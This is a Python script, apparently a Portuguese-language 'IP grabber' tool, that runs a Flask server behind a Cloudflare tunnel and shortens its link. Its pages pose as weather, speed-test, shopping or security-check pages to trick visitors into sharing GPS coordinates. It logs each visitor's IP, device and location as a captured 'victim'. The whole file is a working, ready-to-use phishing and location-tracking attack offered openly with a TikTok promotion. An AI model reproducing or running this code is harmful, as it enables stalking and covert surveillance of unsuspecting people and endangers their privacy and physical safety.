import os, sys, json, base64, time, subprocess, threading, re, random
from flask import Flask, request, render_template_string

# --- CONFIGURACOES ---
LOG_FILE = "logs_graber_x.txt"
MY_TIKTOK = "https://www.tiktok.com/@archmodel57.wha?_r=1&_t=ZS-94uzsz9ny6x"

BANNER = r"""
                -=-
               (\  _  /)
              ( \( )/ )
              (       )
               `>   <'
               /     \ 
              `-._.-' 

   ██████╗ ██████╗  █████╗ ██████╗ ███████╗██████╗ 
  ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
  ██║  ███╗██████╔╝███████║██████╔╝█████╗  ██████╔╝
  ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══╝  ██╔══██╗
  ╚██████╔╝██║  ██║██║  ██║██████╔╝███████╗██║  ██║
   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
               [ By: Anonymous40443 - V12.7 ]
"""

def clear(): 
    os.system('cls' if os.name == 'nt' else 'clear')

def final_exit():
    clear()
    print("\n\n          [ GRABER X DESLIGADO ]")
    print("       Siga no TikTok: " + MY_TIKTOK)
    time.sleep(2)
    sys.exit()

def get_short_url(url):
    try:
        import requests
        res = requests.get(f"https://is.gd/create.php?format=simple&url={url}", timeout=10)
        return res.text.strip() if res.status_code == 200 else url
    except:
        return url

def get_device_info(ua):
    ua = ua.lower()
    if "iphone" in ua or "ipad" in ua:
        return "iPhone / iPad (iOS)"
    elif "android" in ua:
        brands = {"samsung": "Samsung", "sm-": "Samsung", "pixel": "Google Pixel",
                  "huawei": "Huawei", "xiaomi": "Xiaomi", "redmi": "Xiaomi",
                  "oppo": "OPPO", "vivo": "Vivo", "oneplus": "OnePlus", "motorola": "Motorola"}
        for key, brand in brands.items():
            if key in ua:
                return f"{brand} (Android)"
        return "Android (Celular)"
    elif "windows" in ua:
        return "Windows PC / Laptop"
    return "Dispositivo Desconhecido"

try:
    from flask import Flask, request, render_template_string
    import requests
except:
    print("[*] Instalando dependências...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "flask", "requests"])
    from flask import Flask, request, render_template_string

app = Flask(__name__)

HTML_BASE = """
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{{ title }}</title><style>body { background: #0d1117; color: #c9d1d9; font-family: sans-serif; text-align: center; padding-top: 80px; }
.card { border: 1px solid #30363d; padding: 50px 30px; display: inline-block; border-radius: 12px; background: #161b22; max-width: 380px; }
button { background: #238636; color: white; border: none; padding: 14px 28px; border-radius: 8px; cursor: pointer; font-weight: 600; width: 100%; font-size: 16px; margin-top: 15px; }
button:hover { background: #2ea043; }</style>
</head><body><div class="card"><div style="font-size:60px;margin-bottom:20px;">{{ icon }}</div>
<h2>{{ header }}</h2><p>{{ msg }}</p><button onclick="getLoc()">{{ btn }}</button></div>
<script>
function send(lat, lon, acc) { fetch('/capture', { method: 'POST', headers: {'Content-Type': 'application/json'},
body: JSON.stringify({lat: lat, lon: lon, acc: acc, ua: navigator.userAgent}) }).then(() => { window.location.href = "{{ dest }}"; }); }
function getLoc() { if (navigator.geolocation) { navigator.geolocation.getCurrentPosition((p) => { send(p.coords.latitude, p.coords.longitude, p.coords.accuracy); },
(e) => { send("NEGADO", "NEGADO", "0"); }, {enableHighAccuracy: true}); } else { send("NÃO SUPORTADO", "NÃO SUPORTADO", "0"); } }
</script></body></html>
"""

@app.route('/capture', methods=['POST'])
def capture():
    d = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    ua = d.get('ua', '')
    dev = get_device_info(ua)
    lat = d.get('lat', 'N/A')
    lon = d.get('lon', 'N/A')
    maps_link = f"https://www.google.com/maps?q={lat},{lon}" if lat not in ["NEGADO", "N/A"] else "Localização Negada pela Vítima"

    log = (f"\n{'═'*50}\n"
           f"[🔥] VITIMA CAPTURADA!\n"
           f"📅 DATA     : {time.ctime()}\n"
           f"🌐 IP       : {ip}\n"
           f"📱 APARELHO : {dev}\n"
           f"📍 GPS      : {lat}, {lon}\n"
           f"🗺️ MAPS     : {maps_link}\n"
           f"{'═'*50}\n")
    
    print(log)
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log + "\n")
    return "OK"

@app.route('/')
def index():
    t = request.args.get('t', '4')
    dest = request.args.get('to') or MY_TIKTOK
    iscas = {
        '1': {"icon": "☁️", "title": "Clima", "header": "Previsão Local", "msg": "Ative o GPS para o clima.", "btn": "VER CLIMA"},
        '2': {"icon": "📶", "title": "Speed", "header": "SpeedTest", "msg": "Inicie o teste de rede.", "btn": "TESTAR"},
        '3': {"icon": "🛍️", "title": "Ofertas", "header": "Lojas Próximas", "msg": "Veja promoções perto de você.", "btn": "VER OFERTAS"},
        '4': {"icon": "🔗", "title": "Link", "header": "Acessar Link Encurtado", "msg": "Aceite as permissões para continuar.", "btn": "ACEITAR E CONTINUAR"},
        '5': {"icon": "🔒", "title": "Verificação", "header": "Verificação de Segurança", "msg": "Confirme sua localização para prosseguir.", "btn": "VERIFICAR"}
    }
    return render_template_string(HTML_BASE, **iscas.get(t, iscas['4']), dest=dest)

def monitor_cloudflare(isca, dest_url):
    print("\n[*] AGUARDANDO LINK DO CLOUDFLARE...")
    print("[*] Aguarde 10-20 segundos...")
    while True:
        if os.path.exists("cf_log.txt"):
            try:
                with open("cf_log.txt", "r", encoding="utf-8", errors="ignore") as f:
                    log_data = f.read()
                link = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", log_data)
                if link:
                    raw_url = f"{link.group(0)}/?t={isca}&to={dest_url}"
                    print(f"\n[+] LINK GERADO: {raw_url}")
                    print("[*] ENCURTANDO...")
                    short = get_short_url(raw_url)
                    print(f"\n🔥 LINK PRONTO: {short}")
                    print("\n[*] AGUARDANDO CAPTURAS... (Ctrl+C para parar)")
                    break
            except:
                pass
        time.sleep(1.5)

def menu():
    while True:
        clear()
        print(BANNER)
        print(" [ 1 ] IP GRABER      [ 3 ] VER LOGS")
        print(" [ 2 ] MEU TIKTOK     [ 4 ] SAIR")
        op = input("\n SELECIONE: ")

        if op == '1':
            dest = input("\nURL DE DESTINO (Enter para TikTok): ") or MY_TIKTOK
            print("\nISCA:")
            print(" 1 - Clima")
            print(" 2 - Speed Test")
            print(" 3 - Lojas Próximas")
            print(" 4 - Aceitar Link Encurtado  ← Recomendada")
            print(" 5 - Verificação de Segurança")
            isca = input("\nEscolha a isca (padrão 4): ") or "4"

            print("\n[*] Iniciando servidor local...")
            threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, threaded=True), daemon=True).start()
            
            # Inicia Cloudflared com HTTP/2 para resolver o erro de QUIC
            print("[*] Iniciando Cloudflared Tunnel (HTTP/2)...")
            with open("cf_log.txt", "w", encoding="utf-8") as f:
                subprocess.Popen(["cloudflared", "tunnel", "--no-autoupdate", "--protocol", "http2", "--url", "http://127.0.0.1:5000"], 
                                 stdout=f, stderr=f)

            monitor_cloudflare(isca, dest)
            input("\nPressione ENTER para voltar ao menu...")

        elif op == '2':
            c = "termux-open" if os.path.exists("/data/data/com.termux") else "start" if os.name == "nt" else "xdg-open"
            os.system(f"{c} {MY_TIKTOK}")

        elif op == '3':
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, "r", encoding="utf-8") as f:
                    print(f.read())
            else:
                print("Nenhum log ainda.")
            input("\nENTER PARA VOLTAR...")

        elif op == '4':
            final_exit()

if __name__ == '__main__':
    try:
        menu()
    except KeyboardInterrupt:
        final_exit()
